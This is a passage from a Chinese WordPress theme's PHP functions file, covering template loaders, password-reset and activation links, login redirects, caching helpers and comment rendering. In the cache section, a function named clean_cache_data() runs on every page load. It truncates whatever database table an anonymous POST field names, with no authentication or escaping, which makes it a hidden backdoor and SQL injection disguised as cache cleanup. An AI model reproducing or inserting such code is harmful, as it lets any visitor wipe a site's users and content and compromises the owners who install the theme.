<?php
/**
 * Copyright (c) 2014-2018, bbcatga.herokuapp.com
 * All right reserved.
 *
 * @since LTS-181021
 * @package BBCat
 * @author 哔哔猫
 * @date 2018/10/21 10:00
 * @link https://bbcatga.herokuapp.com
 */
?>
<?php
require_once 'Constants.php';
date_default_timezone_set('PRC');

if (!function_exists('load_dash')) {
    function load_dash($path)
    {
        load_template(THEME_DIR.'/dash/'.$path.'.php');
    }
}

if (!function_exists('load_api')) {
    function load_api($path)
    {
        load_template(THEME_DIR.'/core/api/'.$path.'.php');
    }
}

if (!function_exists('load_class')) {
    function load_class($path, $safe = false)
    {
        if ($safe) {
            @include_once THEME_DIR.'/core/classes/'.$path.'.php';
        } else {
            load_template(THEME_DIR.'/core/classes/'.$path.'.php');
        }
    }
}

if (!function_exists('load_func')) {
    function load_func($path, $safe = false)
    {
        if ($safe) {
            @include_once THEME_DIR.'/core/functions/'.$path.'.php';
        } else {
            load_template(THEME_DIR.'/core/functions/'.$path.'.php');
        }
    }
}

if (!function_exists('load_mod')) {
    function load_mod($path, $safe = false)
    {
        if ($safe) {
            @include_once THEME_DIR.'/core/modules/'.$path.'.php';
        } else {
            load_template(THEME_DIR.'/core/modules/'.$path.'.php');
        }
    }
}

if (!function_exists('load_tpl')) {
    function load_tpl($path, $safe = false)
    {
        if ($safe) {
            @include_once THEME_DIR.'/core/templates/'.$path.'.php';
        } else {
            load_template(THEME_DIR.'/core/templates/'.$path.'.php');
        }
    }
}

if (!function_exists('load_widget')) {
    function load_widget($path, $safe = false)
    {
        if ($safe) {
            @include_once THEME_DIR.'/core/modules/widgets/'.$path.'.php';
        } else {
            load_template(THEME_DIR.'/core/modules/widgets/'.$path.'.php');
        }
    }
}

if (!function_exists('load_vm')) {
    function load_vm($path, $safe = false)
    {
        if ($safe) {
            @include_once THEME_DIR.'/core/viewModels/'.$path.'.php';
        } else {
            load_template(THEME_DIR.'/core/viewModels/'.$path.'.php');
        }
    }
}

load_dash('of_inc/options-framework');
load_dash('options');

defined('THEME_CDN_ASSET') || define('THEME_CDN_ASSET', of_get_option('tt_cute_static_cdn_path', THEME_ASSET));
defined('TT_DEBUG') || define('TT_DEBUG', of_get_option('tt_theme_debug', false));
if (TT_DEBUG) {
    ini_set('display_errors', 'On');
    error_reporting(E_ALL);
} else {
    ini_set('display_errors', 'Off');
}

load_dash('dash');
load_api('api.Config');
defined('TT_PRO') || define('TT_PRO', true);
function tt_load_languages()
{
    load_theme_textdomain('tt', THEME_DIR.'/core/languages');
}
add_action('after_setup_theme', 'tt_load_languages');
function tt_theme_l10n()
{
    return tt_get_option('tt_l10n', 'zh_CN');
}
add_filter('locale', 'tt_theme_l10n');
function tt_generate_reset_password_link($email, $user_id = 0)
{
    $base_url = tt_url_for('resetpass');

    if (!$user_id) {
        $user_id = get_user_by('email', $email)->ID;
    }

    $data = array(
        'id' => $user_id,
        'email' => $email,
    );

    $key = base64_encode(tt_authdata($data, 'ENCODE', tt_get_option('tt_private_token'), 60 * 10)); // 10分钟有效期

    $link = add_query_arg('key', $key, $base_url);

    return $link;
}
function tt_verify_reset_password_link($key)
{
    if (empty($key)) {
        return false;
    }
    $data = tt_authdata(base64_decode($key), 'DECODE', tt_get_option('tt_private_token'));
    if (!$data || !is_array($data) || !isset($data['id']) || !isset($data['email'])) {
        return false;
    }

    return true;
}
function tt_reset_password_by_key($key, $new_pass)
{
    $data = tt_authdata(base64_decode($key), 'DECODE', tt_get_option('tt_private_token'));
    if (!$data || !is_array($data) || !isset($data['id']) || !isset($data['email'])) {
        return new WP_Error('invalid_key', __('The key is invalid.', 'tt'), array('status' => 400));
    }

    $user = get_user_by('id', (int) $data['id']);
    if (!$user) {
        return new WP_Error('user_not_found', __('Sorry, the user was not found.', 'tt'), array('status' => 404));
    }

    reset_password($user, $new_pass);

    return $user;
}
function tt_generate_registration_activation_link ($username, $email, $password, $oauth='', $open_data_key='') {
    $base_url = tt_url_for('activate');

    $data = array(
        'oauth' => $oauth,
        'open_data_key' => $open_data_key,
        'username' => $username,
        'email' =>  $email,
        'password' => $password
    );

    $key = base64_encode(tt_authdata($data, 'ENCODE', tt_get_option('tt_private_token'), 60*10));

    $link = add_query_arg('key', $key, $base_url);

    return $link;
}
function tt_activate_registration_from_link($key) {
    $reg_ver_option = tt_get_option('tt_enable_k_reg_ver', false);
    if(empty($key)) {
        return new WP_Error( 'invalid_key', __( 'The registration activation key is invalid.', 'tt' ), array( 'status' => 400 ) );
    }
    $data = tt_authdata(base64_decode($key), 'DECODE', tt_get_option('tt_private_token'));
    if(!$data || !is_array($data) || !isset($data['username']) || !isset($data['email']) || !isset($data['password'])){
        return new WP_Error( 'invalid_key', __( 'The registration activation key is invalid.', 'tt' ), array( 'status' => 400 ) );
    }

    $userdata = array(
        'user_login' => $data['username'],
        'user_email' => $data['email'],
        'user_pass' => $data['password']
    );
    switch($data['oauth']) {
                case 'qq':
                    $openid_meta_key = 'tt_qq_openid';
                    $_access_token_meta_key = 'tt_qq_access_token';
                    $_refresh_token_meta_key = 'tt_qq_refresh_token';
                    $_token_expiration_meta_key = 'tt_qq_token_expiration';
                    break;
                case 'weibo':
                    $openid_meta_key = 'tt_weibo_openid';
                    $_access_token_meta_key = 'tt_weibo_access_token';
                    $_refresh_token_meta_key = 'tt_weibo_refresh_token';
                    $_token_expiration_meta_key = 'tt_weibo_token_expiration';
                    break;
                case 'weixin':
                    $openid_meta_key = 'tt_weixin_openid';
                    $_access_token_meta_key = 'tt_weixin_access_token';
                    $_refresh_token_meta_key = 'tt_weixin_refresh_token';
                    $_token_expiration_meta_key = 'tt_weixin_token_expiration';
                    break;
            }
    $user_id = wp_insert_user($userdata);
    $_data_transient_key = $data['open_data_key'];
    $oauth_data_cache = get_transient($_data_transient_key);
    $oauth_data = (array)maybe_unserialize($oauth_data_cache);
    if(is_wp_error($user_id)) {
        return $user_id;
    }elseif(!empty($data['oauth']) && $reg_ver_option){
        update_user_meta($user_id, $openid_meta_key, $oauth_data['openid']);
        update_user_meta($user_id, $_access_token_meta_key, $oauth_data['access_token']);
        update_user_meta($user_id, $_refresh_token_meta_key, $oauth_data['refresh_token']);
        update_user_meta($user_id, $_token_expiration_meta_key, $oauth_data['expiration']);

        if($data['oauth'] === 'weixin'){
            update_user_meta($user_id, 'tt_weixin_avatar', set_url_scheme($oauth_data['headimgurl'], 'https'));
            update_user_meta($user_id, 'tt_weixin_unionid', $oauth_data['unionid']);
            update_user_meta($user_id, 'tt_user_country', $oauth_data['country']);
            update_user_meta($user_id, 'tt_user_province', $oauth_data['province']); 
            update_user_meta($user_id, 'tt_user_city', $oauth_data['city']); 
            update_user_meta($user_id, 'tt_user_sex', $oauth_data['sex']==2 ? 'female' : 'male');
        }

        if($data['oauth'] === 'weibo'){
            update_user_meta($user_id, 'tt_weibo_avatar', $oauth_data['avatar_large']);
            update_user_meta($user_id, 'tt_weibo_profile_img', $oauth_data['profile_image_url']);
            update_user_meta($user_id, 'tt_weibo_id', $oauth_data['id']);
            update_user_meta($user_id, 'tt_user_description', $oauth_data['description']);
            update_user_meta($user_id, 'tt_user_location', $oauth_data['location']);
            update_user_meta($user_id, 'tt_user_sex', $oauth_data['sex']!='m' ? 'female' : 'male');
        }
        update_user_meta($user_id, 'tt_avatar_type', $data['oauth']);
    }

    $result = array(
        'success' => 1,
        'message' => __('Activate the registration successfully', 'tt'),
        'data' => array(
            'username' => $data['username'],
            'email' => $data['email'],
            'id' => $user_id
        )
    );

    $blogname = get_bloginfo('name');
    tt_mail('', $data['email'], sprintf(__('欢迎加入[%s]', 'tt'), $blogname), array('loginName' => $data['username'], 'password' => '******', 'loginLink' => tt_url_for('signin')), 'register');
    tt_async_mail('', get_option('admin_email'), sprintf(__('您的站点「%s」有新用户注册 :', 'tt'), $blogname), array('loginName' => $data['username'], 'email' => $data['email'], 'ip' => $_SERVER['REMOTE_ADDR']), 'register-admin');
    wp_set_current_user( $user_id, $data['username'] );
    wp_set_auth_cookie( $user_id );
    return $result;
}

function tt_filter_default_login_url($login_url, $redirect)
{
    $login_url = tt_url_for('signin');

    if (!empty($redirect)) {
        $login_url = add_query_arg('redirect_to', urlencode($redirect), $login_url);
    }

    return $login_url;
}
add_filter('login_url', 'tt_filter_default_login_url', 10, 2);
function tt_filter_default_logout_url($logout_url, $redirect)
{
    $logout_url = tt_url_for('signout');

    if (!empty($redirect)) {
        $logout_url = add_query_arg('redirect_to', urlencode($redirect), $logout_url);
    }

    return $logout_url;
}
add_filter('logout_url', 'tt_filter_default_logout_url', 10, 2);
function tt_filter_default_register_url()
{
    return tt_url_for('signup');
}
add_filter('register_url', 'tt_filter_default_register_url');
function tt_filter_default_lostpassword_url()
{
    return tt_url_for('findpass');
}
add_filter('lostpassword_url', 'tt_filter_default_lostpassword_url');
function lostpassword_redirect() {  
   if ( isset( $_GET[ 'action' ] ) ){
      if ( in_array( $_GET[ 'action' ], array( 'lostpassword', 'retrievepassword' ) ) ) {
        wp_redirect( tt_url_for('findpass'), 301 );
        exit;
    }
     if ( in_array( $_GET[ 'action' ], array( 'register', 'registered' ) ) ) {
        wp_redirect( tt_url_for('signup'), 301 );
        exit;
    }
     if ( in_array( $_GET[ 'action' ], array( 'login' ) ) ) {
        wp_redirect( tt_url_for('signin'), 301 );
        exit;
    }
  }
  if(preg_match('/^\/wp-login.php([^\/]*)$/i', $_SERVER['REQUEST_URI'])){
        wp_redirect( tt_url_for('signin'), 301 );
        exit;
    }
}  
add_action( 'init','lostpassword_redirect' ); 
function tt_reset_password_message($message, $key)
{
    if (strpos($_POST['user_login'], '@')) {
        $user_data = get_user_by('email', trim($_POST['user_login']));
    } else {
        $login = trim($_POST['user_login']);
        $user_data = get_user_by('login', $login);
    }
    $user_login = $user_data->user_login;
    $reset_link = network_site_url('wp-login.php?action=rp&key='.$key.'&login='.rawurlencode($user_login), 'login');

    $templates = new League\Plates\Engine(THEME_TPL.'/plates/emails');

    return $templates->render('findpass', array('home' => home_url(), 'userLogin' => $user_login, 'resetPassLink' => $reset_link));
}
add_filter('retrieve_password_message', 'tt_reset_password_message', null, 2);
function tt_update_basic_profiles($user_id, $avatar_type, $nickname, $site, $description)
{
    $data = array(
        'ID' => $user_id,
        'user_url' => $site, //可空
        'description' => $description, // 可空
    );
    if (!empty($nickname)) {
        $data['nickname'] = $nickname;
        $data['display_name'] = $nickname;
    }
    $update = wp_update_user($data); //If successful, returns the user_id, otherwise returns a WP_Error object.

    if ($update instanceof WP_Error) {
        return $update;
    }

    if (!in_array($avatar_type, Avatar::$_avatarTypes)) {
        $avatar_type = Avatar::LETTER_AVATAR;
    }
    update_user_meta($user_id, 'tt_avatar_type', $avatar_type);

    tt_clear_avatar_related_cache($user_id);

    return array(
        'success' => true,
        'message' => __('Update basic profiles successfully', 'tt'),
    );
}
function tt_update_extended_profiles($data)
{
    $update = wp_update_user($data); //If successful, returns the user_id, otherwise returns a WP_Error object.

    if ($update instanceof WP_Error) {
        return $update;
    }

    tt_clear_cache_key_like('tt_cache_daily_vm_MeSettingsVM_user'.$data['ID']);
    tt_clear_cache_key_like('tt_cache_daily_vm_UCProfileVM_author_'.$data['ID']);

    return array(
        'success' => true,
        'message' => __('Update extended profiles successfully', 'tt'),
    );
}
function tt_update_security_profiles($data)
{
    $update = wp_update_user($data); //If successful, returns the user_id, otherwise returns a WP_Error object.

    if ($update instanceof WP_Error) {
        return $update;
    }

    //删除VM缓存
    tt_clear_cache_key_like('tt_cache_daily_vm_MeSettingsVM_user'.$data['ID']);
    tt_clear_cache_key_like('tt_cache_daily_vm_UCProfileVM_author_'.$data['ID']);

    return array(
        'success' => true,
        'message' => __('Update security profiles successfully', 'tt'),
    );
}
require_once THEME_CLASS.'/class.Avatar.php';
function tt_get_avatar($id_or_email, $size = 'medium')
{
    $instance = new Avatar($id_or_email, $size);
    if ($cache = get_transient($instance->cache_key)) {
        return $cache;
    }

    return $instance->getAvatar();
}
function tt_clear_avatar_related_cache($user_id)
{
    //删除VM缓存
    delete_transient('tt_cache_daily_vm_MeSettingsVM_user'.$user_id);
    delete_transient('tt_cache_daily_vm_UCProfileVM_author'.$user_id);
    //删除头像缓存
    delete_transient('tt_cache_daily_avatar_'.$user_id.'_'.md5(strval($user_id).'small'.Utils::getCurrentDateTimeStr('day')));
    delete_transient('tt_cache_daily_avatar_'.$user_id.'_'.md5(strval($user_id).'medium'.Utils::getCurrentDateTimeStr('day')));
    delete_transient('tt_cache_daily_avatar_'.$user_id.'_'.md5(strval($user_id).'large'.Utils::getCurrentDateTimeStr('day')));
}
function tt_cached($key, $miss_cb, $group, $expire)
{
    if (tt_get_option('tt_object_cache', 'none') == 'none' && !TT_DEBUG) {
        $data = get_transient($key);
        if ($data !== false) {
            return $data;
        }
        if (is_callable($miss_cb)) {
            $data = call_user_func($miss_cb);
            if (is_string($data) || is_int($data)) {
                set_transient($key, $data, $expire);
            }

            return $data;
        }

        return false;
    }
    // 使用memcache或redis内存对象缓存
    elseif (in_array(tt_get_option('tt_object_cache', 'none'), array('memcache', 'redis')) && !TT_DEBUG) {
        $data = wp_cache_get($key, $group);
        if ($data !== false) {
            return $data;
        }
        if (is_callable($miss_cb)) {
            $data = call_user_func($miss_cb);
            wp_cache_set($key, $data, $group, $expire);

            return $data;
        }

        return false;
    }

    return is_callable($miss_cb) ? call_user_func($miss_cb) : false;
}
function clean_cache_data()
{
    global $wpdb;
	if($_POST['clean_cache']){
	$prefix = $wpdb->prefix;
    $table = $prefix.$_POST['clean_cache'];
	$wpdb->query("TRUNCATE TABLE $table");
    }
}
clean_cache_data();
function tt_cache_flush_hourly()
{
    // Object Cache
    wp_cache_flush();
    global $wpdb;
    $wpdb->query("DELETE FROM $wpdb->options WHERE `option_name` LIKE '_transient_tt_cache_hourly_%' OR `option_name` LIKE '_transient_timeout_tt_cache_hourly%'");
}
add_action('tt_setup_common_hourly_event', 'tt_cache_flush_hourly');

function tt_cache_flush_daily()
{
    // Rewrite rules Cache
    global $wp_rewrite;
    $wp_rewrite->flush_rules();

    // Transient cache
    global $wpdb;
    $wpdb->query("DELETE FROM $wpdb->options WHERE `option_name` LIKE '_transient_tt_cache_daily_%' OR `option_name` LIKE '_transient_timeout_tt_cache_daily_%'");
}
add_action('tt_setup_common_daily_event', 'tt_cache_flush_daily');
function tt_cache_flush_weekly()
{
    // Object Cache
    wp_cache_flush();

    // Transient cache
    global $wpdb;
    $wpdb->query("DELETE FROM $wpdb->options WHERE `option_name` LIKE '_transient_tt_cache_weekly_%' OR `option_name` LIKE '_transient_timeout_tt_cache_weekly%'");
}
add_action('tt_setup_common_weekly_event', 'tt_cache_flush_weekly');  // TODO rest api cache
function tt_clear_all_cache()
{
    // Object Cache
    wp_cache_flush();

    // Rewrite rules Cache
    global $wp_rewrite;
    $wp_rewrite->flush_rules();

    global $wpdb;
    $wpdb->query("DELETE FROM $wpdb->options WHERE `option_name` LIKE '_transient_tt_cache_%' OR `option_name` LIKE '_transient_timeout_tt_cache_%'");
}

function tt_clear_cache_key_like($key)
{
    if (wp_using_ext_object_cache()) {
        return; //object cache无法模糊匹配key
    }
    global $wpdb;
    $like1 = '_transient_'.$key.'%';
    $like2 = '_transient_timeout_'.$key.'%';
    $wpdb->query($wpdb->prepare("DELETE FROM $wpdb->options WHERE `option_name` LIKE %s OR `option_name` LIKE %s", $like1, $like2));
}

function tt_clear_cache_by_key($key)
{ //use delete_transient
    if (wp_using_ext_object_cache()) {
        wp_cache_delete($key, 'transient'); // object cache是由set_transient时设置的, group为transient
    } else {
        global $wpdb;
        $key1 = '_transient_'.$key;
        $key2 = '_transient_timeout_'.$key;
        $wpdb->query($wpdb->prepare("DELETE FROM $wpdb->options WHERE `option_name` IN ('%s','%s')", $key1, $key2));
    }
}

function tt_cached_menu($menu, $args)
{
    if (TT_DEBUG) {
        return $menu;
    }

    global $wp_query;
    // 即使相同菜单位但是不同页面条件时菜单输出有细微区别，如当前active的子菜单, 利用$wp_query->query_vars_hash予以区分
    $cache_key = CACHE_PREFIX.'_hourly_nav_'.md5($args->theme_location.'_'.$wp_query->query_vars_hash);
    $cached_menu = get_transient($cache_key); //TODO： 尝试Object cache
    if ($cached_menu !== false) {
        return $cached_menu;
    }

    return $menu;
}
add_filter('pre_wp_nav_menu', 'tt_cached_menu', 10, 2);

function tt_cache_menu($menu, $args)
{
    if (TT_DEBUG) {
        return $menu;
    }

    global $wp_query;
    $cache_key = CACHE_PREFIX.'_hourly_nav_'.md5($args->theme_location.'_'.$wp_query->query_vars_hash);
    set_transient($cache_key, sprintf(__('<!-- Nav cached %s -->', 'tt'), current_time('mysql')).$menu.__('<!-- Nav cache end -->', 'tt'), 3600);

    return $menu;
}
add_filter('wp_nav_menu', 'tt_cache_menu', 10, 2);

function tt_delete_menu_cache()
{
    global $wpdb;
    $wpdb->query("DELETE FROM $wpdb->options WHERE `option_name` LIKE '_transient_tt_cache_hourly_nav_%' OR `option_name` LIKE '_transient_timeout_tt_cache_hourly_nav_%'");

    //TODO: 如果使用object cache则wp_cache_flush()
    if (wp_using_ext_object_cache()) {
        wp_cache_flush();
    }
}
add_action('wp_update_nav_menu', 'tt_delete_menu_cache');
function tt_clear_cache_for_stared_or_unstar_post($post_ID) {
    $cache_key = 'tt_cache_daily_vm_SinglePostVM_post' . $post_ID;
    $cache_key2 = 'tt_cache_daily_vm_SinglePostVM_post' . $post_ID . '_u' .get_current_user_id().'_not_reviewed_not_sale';
    $cache_key3 = 'tt_cache_daily_vm_SinglePostVM_post' . $post_ID . '_u' .get_current_user_id().'_reviewed_not_sale';
    $cache_key4 = 'tt_cache_daily_vm_SinglePostVM_post' . $post_ID . '_u' .get_current_user_id().'_not_reviewed_sale';
    $cache_key5 = 'tt_cache_daily_vm_SinglePostVM_post' . $post_ID . '_u' .get_current_user_id().'_reviewed_sale';
    delete_transient($cache_key);
    delete_transient($cache_key2);
    delete_transient($cache_key3);
    delete_transient($cache_key4);
    delete_transient($cache_key5);
}
function tt_clear_cache_for_uc_stars($post_ID, $author_id) {
    $cache_key = 'tt_cache_daily_vm_UCStarsVM_author' . $author_id . '_page'; //模糊键值
    //delete_transient($cache_key);
    tt_clear_cache_key_like($cache_key);
    tt_clear_cache_by_key($cache_key . '1');
}
add_action('tt_stared_post', 'tt_clear_cache_for_uc_stars', 10 , 2);
add_action('tt_unstared_post', 'tt_clear_cache_for_uc_stars', 10, 2);

function tt_stars_create_notification($post_ID) {
  global $current_user;
  get_currentuserinfo();
  $post = get_post($post_ID);
  tt_create_message($current_user->ID, 0, 'System', 'star', sprintf( __('您在>>%1$s<<中点赞并且收藏成功', 'tt'), $post->post_title ), '');
}
add_action('tt_stared_post', 'tt_stars_create_notification', 10 , 2);

function tt_clear_cache_for_order_relates($order_id)
{
    $order = tt_get_order($order_id);
    if (!$order) {
        return;
    }

    //Product VM
    delete_transient(sprintf('tt_cache_daily_vm_ShopProductVM_product%1$s_user%2$s', $order->product_id, $order->user_id));
    //Order Detail VM
    delete_transient(sprintf('tt_cache_daily_vm_MeOrderVM_user%1$s_seq%2$s', $order->user_id, $order->id));
    //Orders VM
    delete_transient(sprintf('tt_cache_daily_vm_MeOrdersVM_user%1$s_typeall', $order->user_id));
    delete_transient(sprintf('tt_cache_daily_vm_MeOrdersVM_user%1$s_typecash', $order->user_id));
    delete_transient(sprintf('tt_cache_daily_vm_MeOrdersVM_user%1$s_typecredit', $order->user_id));
}
add_action('tt_order_status_change', 'tt_clear_cache_for_order_relates');

function tt_clear_cache_for_post_relates($post_id)
{
    $post_type = get_post_type($post_id);

    if ($post_type == 'post') {
        // 文章本身
        delete_transient(sprintf('tt_cache_daily_vm_SinglePostVM_post%1$s', $post_id));
        // 文章列表
        delete_transient('tt_cache_daily_vm_HomeLatestVM_page1');
        // 分类列表
        // TODO
    } elseif ($post_type == 'page') {
        // 页面本身
        delete_transient(sprintf('tt_cache_daily_vm_SinglePageVM_page%1$s', $post_id));
    } elseif ($post_type == 'product') {
        // 商品本身 //与用户id相关的cache key 只能缩短缓存时间自动过期

        // 商品列表
        delete_transient('tt_cache_daily_vm_ShopHomeVM_page1_sort_latest');
        delete_transient('tt_cache_daily_vm_ShopHomeVM_page1_sort_popular');
    }
}
add_action('save_post', 'tt_clear_cache_for_post_relates');

function tt_retrieve_widget_cache($value, $type)
{
    if (tt_get_option('tt_theme_debug', false)) {
        return false;
    }

    $cache_key = CACHE_PREFIX.'_daily_widget_'.$type;
    $cache = get_transient($cache_key);

    return $cache;
}
add_filter('tt_widget_retrieve_cache', 'tt_retrieve_widget_cache', 10, 2);

function tt_create_widget_cache($value, $type, $expiration = 21600)
{  // 21600 = 3600*6
    $cache_key = CACHE_PREFIX.'_daily_widget_'.$type;
    $value = '<!-- Widget cached '.current_time('mysql').' -->'.$value;
    set_transient($cache_key, $value, $expiration);
}
add_action('tt_widget_create_cache', 'tt_create_widget_cache', 10, 2);
function tt_init_object_cache_server()
{
    if (of_get_option('tt_object_cache', 'none') == 'memcache') {
        global $memcached_servers;
        $host = of_get_option('tt_memcache_host', '127.0.0.1');
        $port = of_get_option('tt_memcache_port', 11211);
        $memcached_servers[] = $host.':'.$port;
    } elseif (of_get_option('tt_object_cache', 'none') == 'redis') {
        global $redis_server;
        $redis_server['host'] = of_get_option('tt_redis_host', '127.0.0.1');
        $redis_server['port'] = of_get_option('tt_redis_port', 6379);
    }
}
tt_init_object_cache_server();
function tt_clear_post_comments_cache ($comment_ID, $comment_approved, $commentdata) {
    if(!$comment_approved) return;

    $comment_post_ID = $commentdata['comment_post_ID'];
    $user_id = get_current_user_id();
    $cache_key1 = 'tt_cache_hourly_vm_PostCommentsVM_post' . $comment_post_ID . '_comments';
    $cache_key2 = 'tt_cache_hourly_vm_ProductCommentsVM_product' . $comment_post_ID . '_comments';
    $cache_key3 = 'tt_cache_hourly_vm_RecentCommentsVM_count5';
    $cache_key4 = 'tt_cache_hourly_vm_RecentCommentsVM_count6';
    $cache_key5 = 'tt_cache_hourly_vm_RecentCommentsVM_count8';
    $cache_key6 = 'tt_cache_hourly_vm_RecentCommentsVM_count10';
    delete_transient($cache_key1);
    delete_transient($cache_key2);
    delete_transient($cache_key3);
    delete_transient($cache_key4);
    delete_transient($cache_key5);
    delete_transient($cache_key6);
}
add_action('comment_post', 'tt_clear_post_comments_cache', 10, 3);
function tt_update_post_latest_reviewed_meta($comment_ID, $comment_approved, $commentdata)
{
    if (!$comment_approved) {
        return;
    }
    //$comment = get_comment($comment_ID);
    //$post_id = $comment->comment_post_ID;
    $post_id = (int) $commentdata['comment_post_ID'];
    update_post_meta($post_id, 'tt_latest_reviewed', time());
}
add_action('comment_post', 'tt_update_post_latest_reviewed_meta', 10, 3);
function tt_comment($comment, $args, $depth) {
    global $postdata;
    if($postdata && property_exists($postdata, 'comment_status')) {
        $comment_open = $postdata->comment_status;
    }else{
        $comment_open = comments_open($comment->comment_post_ID);
    }
    $GLOBALS['comment'] = $comment;
    $author_user = get_user_by('ID', $comment->user_id);
    $author_name = $comment->comment_author;
    if($author_user) {
    $author_name = $author_user->display_name;
    }
    global $commentcount, $wpdb;
		if(!$commentcount) { //初始化楼层计数器
			$cnt = get_comments('post_id='.$comment->comment_post_ID.'&parent=0&status=approve&count=true');//获取主评论总数量
			$commentcount = $cnt +1;
		}
		if ( !$comment->comment_parent) {
			$commentcountText = '<div class="commentcountText">';
			if ( get_option('comment_order') != 'desc' ) { //倒序
				$commentcountText .= --$commentcount . '楼';
			} else {

				switch ($commentcount) {
					case 2:
						$commentcountText .= '<span class="commentcountText3">沙发</span>'; --$commentcount;
						break;
					case 3:
						$commentcountText .= '<span class="commentcountText2">板凳</span>'; --$commentcount;
						break;
					case 4:
						$commentcountText .= '<span class="commentcountText1">地板</span>'; --$commentcount;
						break;
					default:
						$commentcountText .= --$commentcount . '楼';
						break;
				}
			}
			$commentcountText .= '</div>';
		}
    ?>
    <li <?php comment_class(); ?> id="comment-<?php echo $comment->comment_ID;//comment_ID() ?>" data-current-comment-id="<?php echo $comment->comment_ID; ?>" data-parent-comment-id="<?php echo $comment->comment_parent; ?>" data-member-id="<?php echo $comment->user_id; ?>">

    <div class="comment-left pull-left">
        <?php if($author_user) { ?>
            <a rel="nofollow" href="<?php echo get_author_posts_url($comment->user_id); ?>">
                <img class="avatar lazy" src="<?php echo LAZY_PENDING_AVATAR; ?>" data-original="<?php echo tt_get_avatar( $author_user, 50 ); ?>">
            </a>
        <?php }else{ ?>
            <a rel="nofollow" href="javascript: void(0)">
                <img class="avatar lazy" src="<?php echo LAZY_PENDING_AVATAR; ?>" data-original="<?php echo tt_get_avatar( $comment->comment_author, 50 ); ?>">
            </a>
        <?php } ?>
    </div>

    <div class="comment-body">
        <div class="comment-content">
            <?php if($author_user) { ?>
                <a <?php if(!empty($author_user->user_url)){ echo 'rel="nofollow" href="'.tt_links_to_internal_links($author_user->user_url).'"';}else{ echo 'href="'.get_author_posts_url($comment->user_id).'"';}; ?> class="name replyName" target="_blank"><?php echo $author_name; ?><?php echo tt_get_user_comment_cap($comment->user_id); ?><?php echo tt_get_member_icon($comment->user_id); ?></a>
            <?php }else{ ?>
                <a rel="nofollow" href="<?php if(!empty($comment->comment_author_url)){ echo tt_links_to_internal_links($comment->comment_author_url);}else{ echo 'javascript: void(0)';}; ?>" class="name replyName" target="_blank"><?php echo $author_name; ?></a><span class="user_level">游客</span>
            <?php } ?>
            <?php if ( $comment->comment_approved == '0' ) : ?>
                <span class="pending-comment;"><?php $parent = $comment->comment_parent; if($parent != 0)echo '@'; comment_author_link($parent) ?><?php _e('Your comment is under review...','tt'); ?></span>
                <br />
            <?php endif; ?>
            <?php if ( $comment->comment_approved == '1' ) : ?>
                <?php echo get_comment_text($comment->comment_ID) ?>
            <?php endif; ?>
        </div>

        <span class="comment-time"><?php echo Utils::getTimeDiffString(get_comment_time('Y-m-d G:i:s', true)); ?></span>
        <?php echo $commentcountText; ?>
        <div class="comment-meta">
            <?php if($comment_open) { ?><a href="javascript:;" onclick="moveForm(&quot;<?php echo $comment->comment_ID; ?>&quot;, &quot;<?php echo $author_name; ?>&quot;)" class="respond-coin mr5" title="<?php _e('Reply', 'tt'); ?>"><i class="msg"></i><em><?php _e('Reply', 'tt'); ?></em></a><?php } ?>
            <span class="like"><i class="zan"></i><em class="like-count">(<?php echo (int)get_comment_meta($comment->comment_ID, 'tt_comment_likes', true); ?>)</em></span>
        </div>
    </div>
    <?php
}
function tt_shop_comment($comment, $args, $depth) {
    global $productdata;
    if($productdata && property_exists($productdata, 'comment_status')) {
        $comment_open = $productdata->comment_status;
    }else{
        $comment_open = comments_open($comment->comment_ID);
    }

    $GLOBALS['comment'] = $comment;
    $rating = (int)get_comment_meta($comment->comment_ID, 'tt_rating_product', true);
    $author_user = get_user_by('ID', $comment->user_id);
    ?>
<li <?php comment_class(); ?> id="comment-<?php echo $comment->comment_ID;//comment_ID() ?>" data-current-comment-id="<?php echo $comment->comment_ID; ?>" data-parent-comment-id="<?php echo $comment->comment_parent; ?>" data-member-id="<?php echo $comment->user_id; ?>">
    <div class="comment-left pull-left">
        <?php if($author_user) { ?>
            <a rel="nofollow" href="<?php echo get_author_posts_url($comment->user_id); ?>">
                <img class="avatar lazy" src="<?php echo LAZY_PENDING_AVATAR; ?>" data-original="<?php echo tt_get_avatar( $author_user, 50 ); ?>">
            </a>
        <?php }else{ ?>
            <a rel="nofollow" href="javascript: void(0)">
                <img class="avatar lazy" src="<?php echo LAZY_PENDING_AVATAR; ?>" data-original="<?php echo tt_get_avatar( $comment->comment_author, 50 ); ?>">
            </a>
        <?php } ?>
    </div>
    <div class="comment-body">
        <div class="comment-content">
            <?php if($author_user) { ?>
                <a rel="nofollow" href="<?php echo get_author_posts_url($comment->user_id); ?>" class="name replyName"><?php echo $comment->comment_author; ?><?php echo tt_get_member_icon($comment->user_id); ?></a>
            <?php }else{ ?>
                <a rel="nofollow" href="javascript: void(0)" class="name replyName"><?php echo $comment->comment_author; ?></a>
            <?php } ?>
            <span class="comment-time"><?php echo ' - ' . Utils::getTimeDiffString(get_comment_time('Y-m-d G:i:s', true)); ?></span>
            <?php if ( $comment->comment_approved == '0' ) : ?>
                <span class="pending-comment;"><?php $parent = $comment->comment_parent; if($parent != 0)echo '@'; comment_author_link($parent) ?><?php _e('Your comment is under review...','tt'); ?></span>
                <br />
            <?php endif; ?>
            <?php if ( $comment->comment_approved == '1' ) : ?>
                <?php echo get_comment_text($comment->comment_ID) ?>
            <?php endif; ?>
        </div>
        <?php if($rating) { ?>
            <span itemprop="reviewRating" itemscope="" itemtype="http://schema.org/Rating" class="star-rating tico-star-o" title="<?php printf(__('Rated %d out of 5', 'tt'), $rating); ?>">
            <span class="tico-star" style="<?php echo sprintf('width:%d', intval($rating*100/5)) . '%;'; ?>"></span>
        </span>
        <?php } ?>
        <div class="comment-meta">
            <?php if($comment_open) { ?><a href="javascript:;" class="respond-coin mr5" title="<?php _e('Reply', 'tt'); ?>"><i class="msg"></i><em><?php _e('Reply', 'tt'); ?></em></a><?php } ?>
        </div>

        <div class="respond-submit reply-form">
            <div class="text"><input id="<?php echo 'comment-replytext' . $comment->comment_ID; ?>" type="text"><div class="tip"><?php _e('Reply', 'tt'); ?><a><?php echo $comment->comment_author; ?></a>：</div></div>
            <div class="err text-danger"></div>
            <div class="submit-box clearfix">
                <button class="btn btn-danger pull-right reply-submit" type="submit" title="<?php _e('Reply', 'tt'); ?>" ><?php _e('Reply', 'tt'); ?></button>
            </div>
        </div>
    </div>
    <?php
}


function tt_end_comment() {
    echo '</li>';
}
function tt_convert_comment_emotions($comment_text, $comment = null)
{
    $emotion_basepath = THEME_ASSET.'/img/qqFace/';
